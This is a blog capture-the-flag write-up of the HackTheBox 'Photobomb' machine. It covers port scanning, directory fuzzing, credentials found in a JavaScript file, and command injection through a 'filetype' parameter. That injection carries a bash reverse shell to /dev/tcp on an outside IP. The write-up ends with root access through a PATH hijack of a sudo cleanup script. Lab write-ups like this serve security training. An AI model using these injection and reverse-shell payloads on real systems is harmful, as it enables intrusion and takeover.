<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin SEO tag -->
<title>Photobomb | 0bfxgh0st*</title>
<meta name="generator" content="0bfxgh0st" />
<meta property="og:title" content="Photobomb" />
<meta name="author" content="0bfxgh0st" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Photobomb WriteUp" />
<meta property="og:description" content="Photobomb WriteUp" />
<link rel="icon" href="/assets/favicon.ico" />
<link rel="canonical" href="#" />
<meta property="og:url" content="#" />
<meta property="og:site_name" content="0bfxgh0st*" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2020-02-25T00:00:00-05:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Photobomb" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"0bfxgh0st"},"dateModified":"2020-02-25T00:00:00-05:00","datePublished":"2020-02-25T00:00:00-05:00","description":"Photobomb WriteUp","headline":"Welcome To 0bfxgh0st Blog","mainEntityOfPage":{"@type":"WebPage","@id":"#"},"url":"#"}</script>
<!-- End SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="#" title="0bfxgh0st*" /></head><body><header class="site-header"><a class="site-title" rel="author" href="/">0bfxgh0st*</a><nav class="site-nav">
      <input type="checkbox" id="nav-trigger" class="nav-trigger" />
      <label for="nav-trigger">
        <span class="menu-icon">
          <svg viewBox="0 0 18 15" width="18px" height="15px">
            <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
          </svg>
        </span>
      </label>

      <div class="trigger">
            <a class="page-link" href="/whoami.html">
              Whoami
            </a>
            <a class="page-link" href="/contact.html">
              Contact
            </a></div>
    </nav><div class="site-icon">
    <img src="/assets/default-icon.png" />
  </div>

</header>
<main class="page-content" aria-label="Content">
        <div class="wrapper">
            <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">Photobomb</h1>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <p>Port recognition with<code class="language-plaintext highlighter-rouge">nmap</code></p>


<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">┌──(root@ghost)-[/home/ghost]
└─# <span class="s2">nmap</span> photobomb.htb --min-rate 5000 -p-
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-16 13:26 EDT
Nmap scan report for photobomb.htb (10.10.11.182)
Host is up (0.14s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 18.42 seconds
</code></pre></figure>
<p>nmap reports two open ports</p>

<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">┌──(root@ghost)-[/home/ghost]
└─# <span class="s2">wfuzz </span>-c --hc=404 -t 100 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://photobomb.htb/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://photobomb.htb/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                            
=====================================================================
                                                                              
000000489:   401        7 L      12 W       188 Ch      "printer"                                                                                                                          
000001227:   401        7 L      12 W       188 Ch      "printers"                                                                                                                         
000004295:   401        7 L      12 W       188 Ch      "printerfriendly"                                                                                                                  
000008558:   401        7 L      12 W       188 Ch      "printer_friendly"                                                                                                                 
000013496:   401        7 L      12 W       188 Ch      "printer_icon"                                                                                                                     
000015253:   401        7 L      12 W       188 Ch      "printer-icon"                                                                                                                     
000015485:   401        7 L      12 W       188 Ch      "printer-friendly"                                                                                                                 
000021900:   401        7 L      12 W       188 Ch      "printerFriendly"                                                                                                                  
000045240:   200        22 L     95 W       843 Ch      "http://photobomb.htb/"                                                                                                            
000047897:   401        7 L      12 W       188 Ch      "printersupplies"                                                                                                                  
000051765:   401        7 L      12 W       188 Ch      "printer1"                                                                                                                         
000052471:   401        7 L      12 W       188 Ch      "printer2"                                                                                                                         
000084465:   401        7 L      12 W       188 Ch      "printericon"                                                                                                                      
000105794:   401        7 L      12 W       188 Ch      "printer_2867"                                                                                                                     
000112086:   401        7 L      12 W       188 Ch      "printer_securit"                                                                                                                  
000154189:   401        7 L      12 W       188 Ch      "printer_drivers"                                                                                                                  
000159305:   401        7 L      12 W       188 Ch      "printer_2"                                                                                                                        
000192008:   401        7 L      12 W       188 Ch      "printer_list"                                                                                                                     
000203184:   401        7 L      12 W       188 Ch      "printerdrivers"                                                                                                                   
000208002:   401        7 L      12 W       188 Ch      "printer-ink"                                                                                                                      

Total time: 0
Processed Requests: 220560
Filtered Requests: 220526
Requests/sec.: 0
</code></pre></figure>

<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">┌──(root@ghost)-[/home/ghost]
└─# <span class="s2">curl </span>http://photobomb.htb
&lt!DOCTYPE html&gt
&lthtml&gt
&lthead&gt
  &lttitle&gtPhotobomb&lt/title&gt
  &ltlink type="text/css" rel="stylesheet" href="styles.css" media="all" /&gt
  &ltscript src="photobomb.js"&gt&lt/script&gt
&lt/head&gt
&ltbody&gt
  &ltdiv id="container"&gt
    &ltheader&gt
      &lth1&gt&lta href="/"&gtPhotobomb&lt/a&gt&lt/h1&gt
    &lt/header&gt
    &ltarticle&gt
      &lth2&gtWelcome to your new Photobomb franchise!&lt/h2&gt
      &ltp&gtYou will soon be making an amazing income selling premium photographic gifts.&lt/p&gt
      &ltp&gtThis state of-the-art web application is your gateway to this fantastic new life. Your wish is its command.&lt/p&gt
      &ltp&gtTo get started, please &lta href="/printer" class="creds"&gtclick here!&lt/a&gt (the credentials are in your welcome pack).&lt/p&gt
      &ltp&gtIf you have any problems with your printer, please call our Technical Support team on 4 4283 77468377.&lt/p&gt
    &lt/article&gt
  &lt/div&gt
&lt/body&gt
&lt/html&gt
</code></pre></figure>

<p>After inspecting the source code we found photobomb.js</p>

<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">┌──(root@ghost)-[/home/ghost]
└─# <span class="s2">curl </span>http://photobomb.htb/photobomb.js
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
</code></pre></figure>

<p>Credentials found user pH0t0 and password b0Mb!</p>

<figure class="highlight">
<img src="/assets/photobomb1.png" />
</figure>

<p>We need to intercept requests with burpsuite to see what is happening when we click on download photo to print button</p>

<figure class="highlight">
<img src="/assets/photobomb2.png" />
</figure>

<p>Let's try if concatenating with a semicolon we can execute commands by sending a ping to our machine</p>

<figure class="highlight">
<img src="/assets/photobomb3.png" />
</figure>

<p>We receive it, let's try to get a shell</p>

<figure class="highlight">
<img src="/assets/photobomb4.png" />
</figure>

<p>Our payload looks like this</p>

<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg;bash%20-c%20%27bash%20-i%20>%26%20/dev/tcp/10.10.14.142/1337%200>%261%27%26&dimensions=3000x2000
</code></pre></figure>

<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">┌──(root@ghost)-[/home/ghost]
└─# <span class="s2">nc </span>-lvp 1337
listening on [any] 1337 ...
connect to [10.10.14.142] from photobomb.htb [10.10.11.182] 45828
bash: cannot set terminal process group (723): Inappropriate ioctl for device
bash: no job control in this shell
wizard@photobomb:~/photobomb$ cat /home/wizard/user.txt
0d42366432da822cff563ded442b9646
</code></pre></figure>

<p>After foward the request we are in the system as wizard user, time to privesc</p>

<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">wizard@photobomb:~/photobomb$ sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh

wizard@photobomb:~/photobomb$ cat /opt/cleanup.sh
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
</code></pre></figure>

<p>As we can see the last find command is not being called from his absolute path, this can be abused</p>

<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">wizard@photobomb:~/photobomb$ echo '/bin/bash' > /tmp/find;chmod +x /tmp/find;sudo PATH=/tmp:$PATH /opt/cleanup.sh
whoami
root
cat /root/root.txt
e33b84a2e9104d5d04f1f186359ad12e
</code></pre></figure>

  </div>

  <p class="post-meta"><time class="dt-published" datetime="2020-02-25T00:00:00-05:00" itemprop="datePublished">
        Oct 16, 2022
      </time>• 
        <span itemprop="author" itemscope itemtype="http://schema.org/Person">
          <span class="p-author h-card" itemprop="name">0bfxgh0st</span></span></p>
  

  <a class="u-url" href="#" hidden></a>
</article>

  </div>
        </div>
    </main><footer class="site-footer h-card">
    <data class="u-url" href="/"></data>

    <div class="wrapper">

        <div class="footer">

        </div>
    </div>

</footer>
</body>

</html>
